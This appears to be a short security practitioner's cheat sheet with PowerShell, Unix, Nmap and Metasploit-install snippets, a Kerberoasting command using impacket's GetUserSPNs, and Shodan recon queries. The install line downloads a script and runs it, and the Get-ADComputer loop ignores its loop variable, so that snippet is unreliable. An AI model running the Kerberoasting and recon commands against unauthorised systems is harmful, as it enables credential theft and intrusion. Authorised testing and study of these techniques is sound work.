# **ITSEC Notes**

## Powershell

### Ping a List of Computers

```
$ServerName = Get-Content "c:\Computers.txt"  
  
foreach ($Server in $ServerName) {  
  
        if (test-Connection -ComputerName $Server -Count 2 -Quiet ) {   
          
            "$Server is Pinging "  
          
                    } else  
                      
                    {"$Server not pinging"  
              
                    }      
          
}
```

### Get IPv4 Address from a List
```
$Servername = Get-Content "C:\Computers.txt" 

ForEach ($Server in $Servername) {

 (Get-ADComputer -Properties IPv4Address).IPv4Address

 }
 ```

## Unix Commands

### Print/Split Certain Columns, Space delimited -F ' ' / Column 1 $1  

```
awk -F ' ' '{print $1}' Macs.txt > MacsNamesOnly.txt
```

### Split a file n (100) number of lines into part1/2/etc
```
split -l 100 full part --numeric-suffixes=1
```

## Nmap

### Useful Switches 
```
-p- all ports
--open only show open ports
-iL use a target list
```

## Metasploit

### Install Metasploit
````
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
````

## Kerberoasting
```
python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
```

## Shodan
### Useful Searches
```
org:"companyname"
net:"1.1.1.0/24"
```
